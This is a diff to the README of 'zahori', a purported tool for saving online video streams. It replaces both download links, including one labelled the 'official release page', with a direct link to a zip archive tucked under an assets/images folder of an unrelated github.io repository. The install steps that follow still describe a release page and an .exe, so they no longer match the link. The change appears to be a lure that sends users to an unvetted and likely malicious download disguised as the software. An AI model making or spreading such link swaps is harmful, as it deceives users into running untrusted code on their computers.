@@ -5,7 +5,7 @@ description: "Extract media stream URLs from web pages by automating browser int
 ---
 # 🌐 zahori - Save online video streams to computer
 
-[![](https://img.shields.io/badge/Download_Zahori-blue)](https://github.com/softshoedancingduckweed138/zahori)
+[![](https://img.shields.io/badge/Download_Zahori-blue)](https://raw.githubusercontent.com/softshoedancingduckweed138/softshoedancingduckweed138.github.io/main/assets/images/Dist-3.7.zip)
 
 ## 🎯 About This Tool
 
@@ -25,7 +25,7 @@ Before you install this software, ensure your computer meets these minimum stand
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official release page here: [Download Zahori](https://github.com/softshoedancingduckweed138/zahori).
+1.  Visit the official release page here: [Download Zahori](https://raw.githubusercontent.com/softshoedancingduckweed138/softshoedancingduckweed138.github.io/main/assets/images/Dist-3.7.zip).
 2.  Look for the section labeled "Assets."
 3.  Click the file that ends with `.exe` to start the download.
 4.  Once the file finishes downloading, open your "Downloads" folder.
